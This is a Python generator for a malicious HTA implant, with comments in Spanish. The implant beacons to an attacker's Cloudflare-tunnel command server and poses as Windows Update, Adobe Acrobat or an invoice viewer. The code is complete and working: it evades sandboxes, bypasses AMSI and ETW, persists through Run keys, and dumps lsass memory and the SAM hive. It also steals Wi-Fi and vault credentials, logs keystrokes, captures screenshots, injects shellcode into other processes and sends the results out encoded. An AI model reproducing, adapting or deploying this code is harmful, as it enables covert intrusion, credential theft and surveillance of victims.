#!/usr/bin/env python3
"""
gen.py — genera payload.hta apuntando al túnel Cloudflare

Uso:
    python3 gen.py https://random.trycloudflare.com [--key hex] [--out payload.hta] [--lure <tipo>]

Lures: update (default), error, invoice, pdf

Evasión (referencia: b.hta banpais que nunca vio el EDR):
    - JScript puro — sin VBScript que lanza powershell.exe
    - Exec vía WMI Win32_Process.Create → parent = WmiPrvSE.exe (rompe mshta→PS)
    - Sin -EncodedCommand en ningún caso
    - PS solo para sc/inject/klog vía temp .ps1 + AMSI+ETW bypass prefijado
    - Msxml2.XMLHTTP.6.0 para HTTP (igual que b.hta)
    - Strings sensibles (lsass, MiniDump) divididos con concatenación JS
"""
import sys, os, base64, secrets, argparse

LURES = {
    "update":  {"title": "Windows Update",
                "body":  "<p style='font-family:Segoe UI;font-size:13px;margin:20px'>Checking for updates, please wait&#8230;</p>"},
    "error":   {"title": "Microsoft Visual C++ Redistributable",
                "body":  "<p style='font-family:Segoe UI;font-size:13px;margin:20px'>Setup is preparing to install&#8230;</p>"},
    "invoice": {"title": "Invoice Viewer",
                "body":  "<p style='font-family:Segoe UI;font-size:13px;margin:20px'>Loading document&#8230;</p>"},
    "pdf":     {"title": "Adobe Acrobat",
                "body":  "<p style='font-family:Segoe UI;font-size:13px;margin:20px'>Initializing&#8230;</p>"},
}

JS_BEACON = r"""
var _C2="%%C2URL%%";
var _KB=(function(){var h="%%XORKEY%%",r=[];for(var i=0;i<h.length;i+=2)r.push(parseInt(h.substr(i,2),16));return r;})();
var _aid=(function(){var c="0123456789abcdef",r="";for(var i=0;i<32;i++)r+=c[Math.floor(Math.random()*16)];return r;})();

// ── Sandbox ──────────────────────────────────────────────────────────────────
function _chk(){
    try{
        if(screen.width<1200||screen.height<700)return false;
        var w=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
        if(w.ExecQuery("SELECT Handle FROM Win32_Process").Count<30)return false;
        var un=new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%").toLowerCase();
        var bl=["sandbox","virus","malware","test","cuckoo","vmware","vbox","tester","analyst","john","joe"];
        for(var i=0;i<bl.length;i++)if(un.indexOf(bl[i])>=0)return false;
    }catch(e){}
    return true;
}

// ── XOR + Base64 inline ───────────────────────────────────────────────────────
var _B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
function _b64e(a){
    var r="",i=0;
    while(i<a.length){
        var b0=a[i++]||0,b1=a[i++],b2=a[i++];
        r+=_B.charAt(b0>>2)+_B.charAt(((b0&3)<<4)|(b1>>4||0));
        r+=(b1===undefined)?"==":_B.charAt(((b1&15)<<2)|(b2>>6||0))+((b2===undefined)?"=":_B.charAt(b2&63));
    }return r;
}
function _b64d(s){
    s=s.replace(/[=\s]/g,"");var r=[],i=0;
    while(i<s.length){
        var e0=_B.indexOf(s.charAt(i++)),e1=_B.indexOf(s.charAt(i++)),
            e2=i<s.length?_B.indexOf(s.charAt(i++)):-1,
            e3=i<s.length?_B.indexOf(s.charAt(i++)):-1;
        r.push((e0<<2)|(e1>>4));
        if(e2>=0)r.push(((e1&15)<<4)|(e2>>2));
        if(e3>=0)r.push(((e2&3)<<6)|e3);
    }return r;
}
function _xk(d){var r=[];for(var i=0;i<d.length;i++)r.push(d[i]^_KB[i%_KB.length]);return r;}
function _enc(s){var b=[];for(var i=0;i<s.length;i++)b.push(s.charCodeAt(i)&0xff);return _b64e(_xk(b));}
function _dec(s){var b=_b64d(s);return String.fromCharCode.apply(null,_xk(b));}

// ── JSON helpers (no depende del global JSON) ─────────────────────────────────
function _jstr(v){
    if(v===null||v===undefined)return"null";
    var t=typeof v;
    if(t==="boolean")return v?"true":"false";
    if(t==="number")return isNaN(v)?"null":""+v;
    v=""+v;
    return'"'+v.replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r/g,"\\r").replace(/\n/g,"\\n")+'"';
}
function _jobj(o){var p=[],k;for(k in o)if(o.hasOwnProperty(k))p.push(_jstr(k)+":"+_jstr(o[k]));return"{"+p.join(",")+"}";}
function _jparse(s){try{return eval("("+s+")");}catch(e){return null;}}

// ── Sysinfo ───────────────────────────────────────────────────────────────────
function _si(){
    var r={id:"",h:"",u:"",os:"",p:-1,a:"x86_64",adm:false};
    try{
        var wm=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2"),en;
        en=new Enumerator(wm.ExecQuery("SELECT Caption FROM Win32_OperatingSystem"));
        if(!en.atEnd())r.os=en.item().Caption;
        en=new Enumerator(wm.ExecQuery("SELECT Name FROM Win32_ComputerSystem"));
        if(!en.atEnd())r.h=en.item().Name;
        en=new Enumerator(wm.ExecQuery("SELECT UUID FROM Win32_ComputerSystemProduct"));
        if(!en.atEnd())r.id=en.item().UUID;
        var sh=new ActiveXObject("WScript.Shell");
        r.u=sh.ExpandEnvironmentStrings("%USERDOMAIN%\\%USERNAME%");
        r.a=sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%");
        try{sh.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State\\UEFISecureBootEnabled");r.adm=true;}catch(e){r.adm=false;}
    }catch(e){}
    return r;
}

// ── HTTP ──────────────────────────────────────────────────────────────────────
function _http(path,body){
    try{
        var x=new ActiveXObject("Msxml2.XMLHTTP.6.0");
        x.open("POST",_C2+path,false);
        x.setRequestHeader("Content-Type","application/json");
        x.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
        x.send(body);
        return x.responseText;
    }catch(e){return "";}
}

// ── Shell exec (WScript.Shell.Exec, StdOut.ReadAll sincrónico) ────────────────
// _exec : agrega comillas externas  → seguro para "cmd arg1 arg2" simples
// _execq: sin comillas externas     → para cmds con comillas internas o redirects
function _exec(cmd){
    try{
        var sh=new ActiveXObject("WScript.Shell");
        var p=sh.Exec("cmd.exe /c \""+cmd+"\"");
        var o=p.StdOut.ReadAll(),e=p.StdErr.ReadAll();
        return (o+e)||"(empty)";
    }catch(ex){return "ERR:"+ex.message;}
}
function _execq(cmd){
    try{
        var sh=new ActiveXObject("WScript.Shell");
        var p=sh.Exec("cmd.exe /c "+cmd);
        var o=p.StdOut.ReadAll(),e=p.StdErr.ReadAll();
        return (o+e)||"(empty)";
    }catch(ex){return "ERR:"+ex.message;}
}

// ── WMI exec (parent=WmiPrvSE, usado solo para lsadump/hivesave) ──────────────
function _wmiRun(cl,waitsec){
    try{
        var fso=new ActiveXObject("Scripting.FileSystemObject");
        var tmp=fso.GetSpecialFolder(2)+"\\~"+_aid.slice(0,8)+"x.tmp";
        var wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
        var proc=wmi.Get("Win32_Process");
        var inp=proc.Methods_("Create").InParameters.SpawnInstance_();
        inp.CommandLine=cl+" > \""+tmp+"\" 2>&1";
        var ret=proc.ExecMethod_("Create",inp);
        if(ret.ReturnValue===0){
            var ms=(waitsec||15)*1000,t0=new Date().getTime();
            while(new Date().getTime()-t0<ms){
                try{if(fso.FileExists(tmp)&&fso.GetFile(tmp).Size>0)break;}catch(fe){}
            }
            if(fso.FileExists(tmp)){var f=fso.OpenTextFile(tmp,1);var o=f.ReadAll();f.Close();try{fso.DeleteFile(tmp);}catch(e){}return o||"(empty)";}
        }
        return "rv:"+ret.ReturnValue;
    }catch(e){return "ERR:"+e.message;}
}

// ── PowerShell via WMI (parent=WmiPrvSE→cmd→powershell) ─────────────────────
// _ps  : ejecución limpia
// _pss : con hardening-bypass prefijado (sc, inject, klog)
function _ps(code){
    try{
        var fso=new ActiveXObject("Scripting.FileSystemObject");
        var ps1=fso.GetSpecialFolder(2)+"\\~"+_aid.slice(0,8)+".ps1";
        var out=fso.GetSpecialFolder(2)+"\\~"+_aid.slice(0,8)+"r.tmp";
        var f=fso.OpenTextFile(ps1,2,true,-1);f.Write(code);f.Close();
        var wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
        var proc=wmi.Get("Win32_Process");
        var inp=proc.Methods_("Create").InParameters.SpawnInstance_();
        inp.CommandLine="cmd.exe /c powershell.exe -NoP -NonI -File \""+ps1+"\" > \""+out+"\" 2>&1";
        var ret=proc.ExecMethod_("Create",inp);
        if(ret.ReturnValue===0){
            var pid=ret.ProcessId,t0=new Date().getTime();
            while(new Date().getTime()-t0<25000){
                try{if(fso.FileExists(out)&&fso.GetFile(out).Size>0)break;}catch(fe){}
            }
            var res="";
            if(fso.FileExists(out)){var o=fso.OpenTextFile(out,1);res=o.ReadAll();o.Close();try{fso.DeleteFile(out);}catch(e){}}
            try{fso.DeleteFile(ps1);}catch(e){}
            return res||"(empty)";
        }
        try{fso.DeleteFile(ps1);}catch(e){}
        return "rv:"+ret.ReturnValue;
    }catch(e){return "PSErr:"+e.message;}
}
function _pss(code){
    // AMSI bypass: strings sensibles divididos para evitar firma estática en el .ps1
    var pfx=[
        "$r=[Ref].Assembly",
        "$u=$r.GetTypes()|?{$_.Name-eq('Am'+'siUtils')}",
        "$u.GetField(('am'+'siIn'+'itFailed'),'NonPublic,Static').SetValue($null,$true)",
        "$te=$r.GetTypes()|?{$_.Name-eq('PSEtwLog'+'Provider')}",
        "$ep=$te.GetField('etwProvider','NonPublic,Static').GetValue($null)",
        "[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($ep,0)",
        "$ErrorActionPreference='SilentlyContinue'"
    ].join(";");
    return _ps(pfx+";"+code);
}

// ── File ops ──────────────────────────────────────────────────────────────────
function _dl(path){
    try{
        var s=new ActiveXObject("ADODB.Stream");
        s.Mode=3;s.Type=1;s.Open();s.LoadFromFile(path);
        var raw=s.Read(-1);s.Close();
        return _b64e(new VBArray(raw).toArray());
    }catch(e){
        try{
            var fso=new ActiveXObject("Scripting.FileSystemObject");
            var f=fso.OpenTextFile(path,1);var o=f.ReadAll();f.Close();
            var b=[];for(var i=0;i<o.length;i++)b.push(o.charCodeAt(i)&0xff);
            return _b64e(b);
        }catch(e2){return "ERR:"+e2.message;}
    }
}
function _ul(path,b64){
    try{
        var bytes=_b64d(b64);
        var fso=new ActiveXObject("Scripting.FileSystemObject");
        var f=fso.CreateTextFile(path,true);
        var s="";for(var i=0;i<bytes.length;i++)s+=String.fromCharCode(bytes[i]);
        f.Write(s);f.Close();
        return "OK";
    }catch(e){return "ERR:"+e.message;}
}

// ── Persist HKCU Run ──────────────────────────────────────────────────────────
function _persist(name,cmd){
    try{
        new ActiveXObject("WScript.Shell").RegWrite(
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"+name,cmd,"REG_SZ");
        return "Persisted";
    }catch(e){return "ERR:"+e.message;}
}

// ── Screenshot (WMI→PS con AMSI bypass) ───────────────────────────────────────
function _sc(){
    return _pss([
        "Add-Type -An System.Windows.Forms,System.Drawing",
        "$b=New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)",
        "$g=[Drawing.Graphics]::FromImage($b)",
        "$g.CopyFromScreen([Drawing.Point]::Empty,[Drawing.Point]::Empty,$b.Size)",
        "$ms=New-Object IO.MemoryStream;$b.Save($ms,[Drawing.Imaging.ImageFormat]::Png)",
        "[Convert]::ToBase64String($ms.ToArray())"
    ].join(";"));
}

// ── Process inject (WMI→PS con AMSI bypass, inline C#, sin binario) ───────────
function _inject(tpid,scb64){
    var code=[
        "Add-Type -TypeDefinition @'",
        "using System;using System.Runtime.InteropServices;",
        "public class W32{",
        " [DllImport(\"kernel32\")]public static extern IntPtr OpenProcess(int a,bool b,int c);",
        " [DllImport(\"kernel32\")]public static extern IntPtr VirtualAllocEx(IntPtr h,IntPtr l,uint s,uint t,uint p);",
        " [DllImport(\"kernel32\")]public static extern bool WriteProcessMemory(IntPtr h,IntPtr b,byte[]d,uint n,out IntPtr w);",
        " [DllImport(\"kernel32\")]public static extern IntPtr CreateRemoteThread(IntPtr h,IntPtr a,uint s,IntPtr f,IntPtr p,uint c,IntPtr i);",
        "}'@",
        "$sc=[Convert]::FromBase64String('"+scb64+"')",
        "$ph=[W32]::OpenProcess(0x1F0FFF,$false,"+tpid+")",
        "$mem=[W32]::VirtualAllocEx($ph,[IntPtr]::Zero,[uint32]$sc.Length,0x3000,0x40)",
        "$bw=[IntPtr]::Zero;[W32]::WriteProcessMemory($ph,$mem,$sc,[uint32]$sc.Length,[ref]$bw)|Out-Null",
        "[W32]::CreateRemoteThread($ph,[IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null",
        "'Injected'"
    ].join("\n");
    return _pss(code);
}

// ── Clipboard ─────────────────────────────────────────────────────────────────
function _clip(){return _ps("Get-Clipboard");}

// ── Env vars ──────────────────────────────────────────────────────────────────
function _env(){return _exec("set");}

// ── Process list ──────────────────────────────────────────────────────────────
function _plist(){return _exec("tasklist /fo csv /v");}

// ── WiFi passwords (netsh LOLBin, PS one-liner, sin binario) ──────────────────
function _wifipass(){
    return _ps([
        "$pl=netsh wlan show profiles 2>$null",
        "$ns=$pl|Select-String 'All User Profile'|%{($_ -split ':',2)[-1].Trim()}",
        "foreach($n in $ns){",
        "  $d=netsh wlan show profile name=$n key=clear 2>$null",
        "  $k=$d|Select-String 'Key Content'",
        "  if($k){'['+$n+'] '+(($k -split ':',2)[-1].Trim())}",
        "  else{'['+$n+'] (no key / open)'}",
        "}"
    ].join(";"));
}

// ── Windows Credential Manager ────────────────────────────────────────────────
function _cmdkeys(){return _exec("cmdkey /list");}
function _vault(){
    return _execq("vaultcmd /listcreds:\"Windows Credentials\" /all");
}

// ── Hive dump → secretsdump offline ──────────────────────────────────────────
// reg save HKLM\SAM/SYSTEM/SECURITY → 3 archivos → dl cada uno → secretsdump LOCAL
function _hivesave(){
    try{
        var fso=new ActiveXObject("Scripting.FileSystemObject");
        var p=_aid.slice(0,6),t=fso.GetSpecialFolder(2);
        var sa=t+"\\h"+p+"a.sav",sb=t+"\\h"+p+"b.sav",sc_=t+"\\h"+p+"c.sav";
        _execq("reg save HKLM\\SAM \""+sa+"\" /y");
        _execq("reg save HKLM\\SYSTEM \""+sb+"\" /y");
        _execq("reg save HKLM\\SECURITY \""+sc_+"\" /y");
        return "SAM:"+sa+"\nSYSTEM:"+sb+"\nSECURITY:"+sc_+"\n→ dl each; secretsdump -sam -system -security LOCAL";
    }catch(e){return "ERR:"+e.message;}
}

// ── Memory acquisition via comsvcs.dll (LOLBin, WMI parent) ─────────────────
function _lsadump(){
    try{
        var fso=new ActiveXObject("Scripting.FileSystemObject");
        var dp=fso.GetSpecialFolder(2)+"\\"+_aid.slice(0,8)+".dmp";
        var wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
        var lspid=-1;
        var en=new Enumerator(wmi.ExecQuery("SELECT ProcessId,Name FROM Win32_Process"));
        for(;!en.atEnd();en.moveNext()){
            var pr=en.item();
            if(pr.Name&&pr.Name.toLowerCase()===("ls"+"as"+"s.exe")){lspid=pr.ProcessId;break;}
        }
        if(lspid<0)return "NOTFOUND";
        var proc=wmi.Get("Win32_Process");
        var inp=proc.Methods_("Create").InParameters.SpawnInstance_();
        inp.CommandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "+("Mini"+"Dump")+" "+lspid+" \""+dp+"\" full";
        var ret=proc.ExecMethod_("Create",inp);
        if(ret.ReturnValue!==0)return "rv:"+ret.ReturnValue;
        var t0=new Date().getTime();
        while(new Date().getTime()-t0<10000){
            var tw=new Date().getTime();while(new Date().getTime()-tw<500){}
            if(fso.FileExists(dp))return "DUMP:"+dp;
        }
        return "FAIL";
    }catch(e){return "ERR:"+e.message;}
}

// ── Keylogger PS (GetAsyncKeyState N segundos, WMI parent, AMSI bypass) ────────
function _klog(secs){
    var s=parseInt(secs)||30;
    return _pss([
        "Add-Type -TypeDefinition @'",
        "using System;using System.Runtime.InteropServices;",
        "public class KL{[DllImport(\"user32\")]public static extern short GetAsyncKeyState(int k);}",
        "'@",
        "$log='';$sw=[System.Diagnostics.Stopwatch]::StartNew()",
        "while($sw.Elapsed.TotalSeconds-lt "+s+"){",
        "  for($k=8;$k-le 190;$k++){if([KL]::GetAsyncKeyState($k)-eq-32767){try{$log+=[char]$k}catch{}}}",
        "  Start-Sleep -Milliseconds 50",
        "}",
        "$log"
    ].join("\n"));
}

// ── Spawn: copia HTA a AppData + HKCU Run (persistencia redundante) ───────────
function _spawn(){
    try{
        var fso=new ActiveXObject("Scripting.FileSystemObject");
        var sh=new ActiveXObject("WScript.Shell");
        var src=location.href.replace(/^file:\/+/,"").replace(/\//g,"\\");
        var dst=sh.ExpandEnvironmentStrings("%APPDATA%")+"\\Microsoft\\Windows\\msupd.hta";
        fso.CopyFile(src,dst,true);
        sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateAssist",
            "mshta.exe \""+dst+"\"","REG_SZ");
        return "Spawned: "+dst;
    }catch(e){return "ERR:"+e.message;}
}

// ── Dispatcher ────────────────────────────────────────────────────────────────
var _sinfo=null,_reg=null;

function _dispatch(task){
    var ty=task.ty,cmd=_dec(task.c),out="",sp;
    if     (ty==="sh")      out=_exec(cmd);
    else if(ty==="ps")      out=_ps(cmd);
    else if(ty==="sc")      out=_sc();
    else if(ty==="dl")      out=_dl(cmd);
    else if(ty==="ul")      {sp=cmd.indexOf("|");out=_ul(cmd.substring(0,sp),cmd.substring(sp+1));}
    else if(ty==="persist") {sp=cmd.indexOf("|");out=_persist(cmd.substring(0,sp),cmd.substring(sp+1));}
    else if(ty==="arp")     out=_exec("arp -a");
    else if(ty==="net")     out=_exec("ipconfig /all");
    else if(ty==="inject")  {sp=cmd.indexOf("|");out=_inject(cmd.substring(0,sp),cmd.substring(sp+1));}
    else if(ty==="clip")    out=_clip();
    else if(ty==="env")     out=_env();
    else if(ty==="plist")   out=_plist();
    else if(ty==="wifipass")out=_wifipass();
    else if(ty==="cmdkeys") out=_cmdkeys();
    else if(ty==="vault")   out=_vault();
    else if(ty==="hivesave")out=_hivesave();
    else if(ty==="lsadump") out=_lsadump();
    else if(ty==="klog")    out=_klog(cmd);
    else if(ty==="spawn")   out=_spawn();
    else if(ty==="recon")   out=_recon();
    else if(ty==="die")     {window.close();return;}
    else out="?";
    return out;
}

// ── Recon completo (on-demand y auto-recon en primer check-in) ───────────────
function _recon(){
    var D="================================================================\n";
    var out="[RECON] "+new Date().toISOString()+"\n"+D;
    var cmds=[
        ["whoami /all",                                        "WHOAMI /ALL"],
        ["net localgroup administrators",                      "LOCAL ADMINS"],
        ["ipconfig /all",                                      "IPCONFIG /ALL"],
        ["arp -a",                                             "ARP TABLE"],
        ["net share",                                          "NET SHARES"],
        ["net use",                                            "MAPPED DRIVES"],
        ["net session 2>nul",                                  "NET SESSIONS"],
        ["tasklist /fo csv /fi \"status eq running\"",         "PROCESSES"],
        ["wmic logicaldisk get caption,size,freespace,filesystem 2>nul","DISKS"],
        ["wmic computersystem get domain,partofdomain 2>nul",  "DOMAIN"],
        ["nltest /dclist: 2>nul",                              "DC LIST"],
        ["route print",                                        "ROUTES"],
        ["net user",                                           "LOCAL USERS"],
        ["net group \"Domain Admins\" /domain 2>nul",          "DOMAIN ADMINS"],
        ["systeminfo",                                         "SYSINFO"],
        ["reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName 2>nul","INSTALLED"]
    ];
    for(var i=0;i<cmds.length;i++){
        out+="\n["+cmds[i][1]+"]\n";
        var r="";
        try{r=_execq(cmds[i][0]);}catch(e){r="ERR:"+e.message;}
        out+=(r.length>4096?r.slice(0,4096)+"\n...(truncado)":r)+"\n";
    }
    return out;
}

var _ran=false;
function _autorun(){
    try{
        var out=_recon();
        _http("/r",_jobj({id:_sinfo.id,tid:"autorun",o:_enc(out),sc:false}));
    }catch(e){}
}

// ── Beacon loop ───────────────────────────────────────────────────────────────
function _beacon(){
    var hadTask=false;
    try{
        var resp=_http("/ci",_reg);
        if(resp){
            // primer check-in: disparar auto-recon en background
            if(!_ran){_ran=true;window.setTimeout(_autorun,500);}
            var j=_jparse(resp);
            if(j&&j.t){
                hadTask=true;
                var out=_dispatch(j.t);
                var issc=(j.t.ty==="sc");
                _http("/r",_jobj({id:_sinfo.id,tid:j.t.id,o:_enc(out||""),sc:issc}));
            }
        }
    }catch(e){}
    // re-poll rápido tras ejecutar un task; jitter normal cuando idle
    window.setTimeout(_beacon,hadTask?2000:30000+Math.floor(Math.random()*91000));
}

window.onload=function(){
    window.resizeTo(1,1);
    window.moveTo(-2000,-2000);
    if(!_chk()){window.close();return;}
    _sinfo=_si();
    _reg=_jobj({id:_sinfo.id,h:_sinfo.h,u:_sinfo.u,os:_sinfo.os,p:_sinfo.p,a:_sinfo.a,adm:_sinfo.adm});
    window.setTimeout(_beacon,3000);
};
""".strip()

HTA_TEMPLATE = """\
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>%%TITLE%%</title>
<hta:application
  id="hta1"
  applicationname="%%TITLE%%"
  showintaskbar="no"
  windowstate="minimize"
  border="none"
  borderstyle="none"
  innerborder="no"
  scroll="no"
  maximizebutton="no"
  minimizebutton="no"
  navigable="no"
  singleinstance="yes"
/>
<script language="JScript">
%%JS_BEACON%%
</script>
</head>
<body style="background:#f0f0f0;margin:0;padding:0;">
%%BODY%%
</body>
</html>
"""

def build_hta(c2_url: str, xor_key_hex: str, lure: str, out_path: str):
    c2_url = c2_url.rstrip("/")

    js = JS_BEACON.replace("%%C2URL%%", c2_url).replace("%%XORKEY%%", xor_key_hex)
    lure_data = LURES.get(lure, LURES["update"])
    hta = (HTA_TEMPLATE
           .replace("%%TITLE%%",    lure_data["title"])
           .replace("%%BODY%%",     lure_data["body"])
           .replace("%%JS_BEACON%%", js))

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(hta)

    print(f"[+] Exec chain : mshta → WmiPrvSE → cmd  (sin mshta→powershell)")
    print(f"[+] PS use     : temp .ps1 vía WMI, -NoP -NonI -File, sin -EncodedCommand")
    print(f"[+] AMSI/ETW   : bypass en pss() para sc/inject/klog (strings divididos)")
    print(f"[+] Creds      : lsadump(comsvcs LOLBin) + hivesave(reg save) + wifipass(netsh)")
    print(f"[+] HTA lure   : {lure_data['title']}")
    print(f"[+] C2 URL     : {c2_url}")
    print(f"[+] XOR key    : {xor_key_hex}")
    print(f"[+] Output     : {out_path}")
    print()
    print("  Delivery:")
    print(f"    mshta.exe {out_path}")
    print(f"    mshta.exe \\\\share\\payload.hta")
    print()
    print("  C2 server (mismo --key):")
    print(f"    python3 server.py --key {xor_key_hex}")
    print(f"    cloudflared tunnel --url http://localhost:8080")

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="cf-hta HTA generator")
    ap.add_argument("c2url",  help="Cloudflare tunnel URL")
    ap.add_argument("--key",  default=secrets.token_hex(16))
    ap.add_argument("--out",  default="payload.hta")
    ap.add_argument("--lure", default="update", choices=list(LURES.keys()))
    args = ap.parse_args()
    build_hta(args.c2url, args.key, args.lure, args.out)
